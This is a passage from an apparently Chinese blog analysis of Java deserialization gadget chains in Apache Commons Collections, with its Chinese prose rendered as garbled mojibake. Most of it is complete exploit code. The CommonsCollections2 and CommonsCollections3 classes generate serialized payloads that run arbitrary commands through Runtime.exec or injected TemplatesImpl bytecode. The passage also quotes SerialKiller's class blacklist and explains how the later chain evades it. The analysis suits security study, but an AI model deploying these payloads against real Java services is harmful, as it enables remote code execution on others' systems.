class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨åˆ›å»º <code>PriorityQueue</code> å®¹å™¨æ—¶æŒ‡å®šæ¯”è¾ƒå¯¹è±¡ä¸ºæˆ‘ä»¬å®šä¹‰çš„ <code>TransformingComparator</code>ï¼Œä¹‹åå¾€ <code>PriorityQueue</code> ä¸­éšä¾¿æ”¾ä¸¤ä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šè°ƒç”¨ <code>comparator.compare</code> æ–¹æ³•è§¦å‘ <code>transform</code> æ–¹æ³•è°ƒç”¨ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br></pre></td></tr></table></figure></div>

<h4 id="åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰"><a href="#åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰" class="headerlink" title="åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰"></a>åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰</h4><p>ç±» <code>org.apache.commons.collections4.comparators.TransformingComparator</code> åœ¨ commons-collections4.0 ä»¥å‰æ˜¯ç‰ˆæœ¬ä¸­æ˜¯æ²¡æœ‰å®ç° <code>Serializable</code> æ¥å£çš„ï¼Œå› æ­¤è¿™ä¸ªåˆ©ç”¨é“¾åªèƒ½åœ¨ commons-collections4.0 ä½¿ç”¨ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="number">1</span>, <span class="number">1</span>&#125;);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:185)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:414)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:451)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.&lt;init&gt;(TrAXFilter.java:64)</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸç†åˆ†æï¼ˆâ€¦â†’TrAXFilterâ†’InstantiateTransformerï¼‰"><a href="#åŸç†åˆ†æï¼ˆâ€¦â†’TrAXFilterâ†’InstantiateTransformerï¼‰" class="headerlink" title="åŸç†åˆ†æï¼ˆâ€¦â†’TrAXFilterâ†’InstantiateTransformerï¼‰"></a>åŸç†åˆ†æï¼ˆâ€¦â†’TrAXFilterâ†’InstantiateTransformerï¼‰</h4><p>2015 å¹´åˆï¼Œ@frohoff å’Œ @gebl å‘å¸ƒäº† Talkã€Š<a class="link"   target="_blank" rel="noopener" href="https://frohoff.github.io/appseccali-marshalling-pickles/" >Marshalling Pickles: how deserializing objects will ruin your day<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‹ï¼Œä»¥åŠ Java ååºåˆ—åŒ–åˆ©ç”¨å·¥å…· ysoserialï¼Œéšåå¼•çˆ†äº†å®‰å…¨ç•Œã€‚å¼€å‘è€…ä»¬è‡ªç„¶ä¼šå»æ‰¾å¯»ä¸€ç§å®‰å…¨çš„è¿‡æ»¤æ–¹æ³•ï¼Œäºæ˜¯ç±»ä¼¼ <a class="link"   target="_blank" rel="noopener" href="https://github.com/ikkisoft/SerialKiller" >SerialKiller<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> è¿™æ ·çš„å·¥å…·éšä¹‹è¯ç”Ÿã€‚</p>
<p>SerialKiller æ˜¯ä¸€ä¸ª Java ååºåˆ—åŒ–è¿‡æ»¤å™¨ï¼Œå¯ä»¥é€šè¿‡é»‘åå•ä¸ç™½åå•çš„æ–¹å¼æ¥é™åˆ¶ååºåˆ—åŒ–æ—¶å…è®¸é€šè¿‡çš„ç±»ã€‚åœ¨å…¶å‘å¸ƒçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ç»™å‡ºäº†æœ€åˆçš„<a class="link"   target="_blank" rel="noopener" href="https://github.com/ikkisoft/SerialKiller/blob/998c0abc5b/config/serialkiller.conf" >é»‘åå•<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼š</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- serialkiller.conf --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">refresh</span>&gt;</span>6000<span class="tag">&lt;/<span class="name">refresh</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">blacklist</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections1 payload  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.apache\.commons\.collections\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">    <span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections2 payload  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.apache\.commons\.collections4\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ysoserial&#x27;s Groovy payload  --&gt;</span>	</span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.codehaus\.groovy\.runtime\.ConvertedClosure$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.codehaus\.groovy\.runtime\.MethodClosure$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">    <span class="comment">&lt;!-- ysoserial&#x27;s Spring1 payload  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.springframework\.beans\.factory\.ObjectFactory$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">    <span class="tag">&lt;/<span class="name">blacklist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">whitelist</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>.*<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">whitelist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªé»‘åå•ä¸­ <code>InvokerTransformer</code> èµ«ç„¶åœ¨åˆ—ï¼Œä¹Ÿå°±åˆ‡æ–­äº† <code>CommonsCollections1</code> çš„åˆ©â½¤é“¾ã€‚æœ‰æ”»å°±æœ‰é˜²ï¼Œysoserial éšåå¢åŠ äº†ä¸å°‘æ–°çš„ Gadgetsï¼Œå…¶ä¸­å°±åŒ…æ‹¬ CommonsCollections3ã€‚</p>
<p>CommonsCollections3 çš„ç›®çš„å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯ä¸ºäº†ç»•è¿‡ä¸€äº›è§„åˆ™å¯¹ <code>InvokerTransformer</code> çš„é™åˆ¶ã€‚CommonsCollections3 å¹¶æ²¡æœ‰ä½¿ç”¨åˆ° <code>InvokerTransformer</code> æ¥è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œè€Œæ˜¯ç”¨åˆ°äº†å¦ä¸€ä¸ªç±»ï¼Œ<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>ã€‚</p>
<p>è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ä¸­è°ƒç”¨äº† <code>(TransformerImpl) templates.newTransformer()</code> ï¼Œå…å»äº†æˆ‘ä»¬ä½¿ç”¨ <code>InvokerTransformer</code> æ‰‹å·¥è°ƒç”¨ <code>newTransformer()</code> æ–¹æ³•è¿™ä¸€æ­¥ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer(); <span class="comment">// ğŸ‘ˆ</span></span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹ <code>ChainedTransformer</code>ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><strong>å¹¶ä¸”å¦‚æœè§¦å‘ <code>transform</code> è°ƒç”¨çš„æ—¶å€™å‚æ•°å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿˜å¯ä»¥è¿›ä¸€æ­¥ä¼˜åŒ–æ‰ <code>ConstantTransformer</code> å’Œ <code>ChainedTransformer</code>ã€‚</strong></p>
<h4 id="åˆ©ç”¨ä»£ç "><a href="#åˆ©ç”¨ä»£ç " class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h4><p>å…¶å®è¿™é‡Œå¯ä»¥è‡ªç”±ç»„åˆå…¶ä»–çš„é“¾ï¼Œåªè¦èƒ½è°ƒç”¨åˆ° <code>transform</code> æ–¹æ³•å³å¯ï¼Œè¿™é‡Œåªä¸¾ä¾‹èƒ½å¤Ÿçœç•¥ <code>ChainedTransformer</code> çš„æƒ…å†µã€‚</p>
<h5 id="CC5ï¼ˆCC3-CC4ï¼‰"><a href="#CC5ï¼ˆCC3-CC4ï¼‰" class="headerlink" title="CC5ï¼ˆCC3&#x2F;CC4ï¼‰"></a>CC5ï¼ˆCC3&#x2F;CC4ï¼‰</h5><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(exception, <span class="string">&quot;val&quot;</span>, entry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> exception;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> 